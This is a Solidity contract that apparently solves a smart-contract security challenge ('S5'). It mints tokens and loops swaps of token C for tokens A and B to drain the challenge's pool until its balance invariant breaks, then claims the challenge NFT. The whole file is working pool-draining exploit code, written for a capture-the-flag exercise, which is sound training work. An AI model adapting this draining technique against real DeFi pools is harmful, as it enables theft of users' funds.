// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { ERC721Holder } from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
import { IERC721 } from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import { S5 } from "../challenges/S5.sol";
import { S5Pool } from "../../src/challenges/S5Pool.sol";
import { S5Token } from "../../src/challenges/S5Token.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract Solution5 is ERC721Holder {
    error Solution5__SolveFailed();
    error Solution5__IncorrectOwnedTokenId();
    error Solution5__ZeroAddressNotAllowed();

    S5 public immutable i_challenge;
    S5Pool public immutable i_pool;
    IERC721 public immutable i_nft;

    S5Token public immutable i_tokenA;
    S5Token public immutable i_tokenB;
    S5Token public immutable i_tokenC;

    uint256 constant TOKEN_MINT_PRECISION = 1e18;
    uint256 public initialTotalTokens; // same as S5 constructor 'i_initialTotalTokens'

    constructor(S5 _challenge, IERC721 _nft) {
        i_challenge = (_challenge);
        i_nft = _nft;

        address _getPool = i_challenge.getPool();
        address _getTokenA = i_challenge.getTokenA();
        address _getTokenB = i_challenge.getTokenB();
        address _getTokenC = i_challenge.getTokenC();

        if (_getPool == address(0)) {
            revert Solution5__ZeroAddressNotAllowed();
        }
        if (_getTokenA == address(0)) {
            revert Solution5__ZeroAddressNotAllowed();
        }
        if (_getTokenB == address(0)) {
            revert Solution5__ZeroAddressNotAllowed();
        }
        if (_getTokenC == address(0)) {
            revert Solution5__ZeroAddressNotAllowed();
        }

        i_pool = S5Pool(_getPool);
        i_tokenA = S5Token(_getTokenA);
        i_tokenB = S5Token(_getTokenB);
        i_tokenC = S5Token(_getTokenC);

        initialTotalTokens = i_tokenA.INITIAL_SUPPLY() + i_tokenB.INITIAL_SUPPLY();
    }

    function owner() external view returns (address) {
        return address(this);
    }

    function solve() external {
        bool _invariantSolved = false;
        while (_invariantSolved != true) {
            // pool have enough balance
            uint256 _poolBalanceOfTokenA = IERC20(i_tokenA).balanceOf(address(i_pool));
            uint256 _poolBalanceOfTokenB = IERC20(i_tokenB).balanceOf(address(i_pool));
            // drain token A from pool
            if (_poolBalanceOfTokenA > TOKEN_MINT_PRECISION) {
                _mintTokensAndApprovals();
                i_pool.swapFrom(IERC20(i_tokenC), IERC20(i_tokenA), TOKEN_MINT_PRECISION);
            }
            // drain token B from pool
            if (_poolBalanceOfTokenB > TOKEN_MINT_PRECISION) {
                _mintTokensAndApprovals();
                i_pool.swapFrom(IERC20(i_tokenC), IERC20(i_tokenB), TOKEN_MINT_PRECISION);
            }

            _invariantSolved = _isInvariantSolved();
        }
        // deposit in order to redeem successfully when solving challenge
        _deposit();
        i_challenge.solveChallenge("thecil_eth");
    }

    function withdrawNft(uint256 _tokenId) external {
        if (i_nft.ownerOf(_tokenId) != address(this)) {
            revert Solution5__IncorrectOwnedTokenId();
        }
        i_nft.safeTransferFrom(address(this), msg.sender, _tokenId, "");
    }

    /**
     * @dev check if challenge invariant has been solved
     * @return true if challenge invariant has been solved, false otherwise
     * if (s_tokenA.balanceOf(address(this)) + s_tokenB.balanceOf(address(this)) >= i_initialTotalTokens)
     */
    function _isInvariantSolved() private view returns (bool) {
        uint256 amountA = IERC20(i_tokenA).balanceOf(address(i_challenge));
        uint256 amountB = IERC20(i_tokenB).balanceOf(address(i_challenge));
        return !(amountA + amountB >= initialTotalTokens);
    }

    function _mintTokensAndApprovals() private {
        // mint tokens
        i_tokenA.mint(address(this));
        i_tokenB.mint(address(this));
        i_tokenC.mint(address(this));
        // allow pool to transfer tokens
        IERC20(address(i_tokenA)).approve(address(i_pool), type(uint256).max);
        IERC20(address(i_tokenB)).approve(address(i_pool), type(uint256).max);
        IERC20(address(i_tokenC)).approve(address(i_pool), type(uint256).max);
    }

    function _deposit() private {
        // mint more so we can deposit
        _mintTokensAndApprovals();
        // deposit tokens to pool
        uint64 deadline = uint64(block.timestamp + 20 seconds);
        i_pool.deposit(TOKEN_MINT_PRECISION, deadline);
    }
}
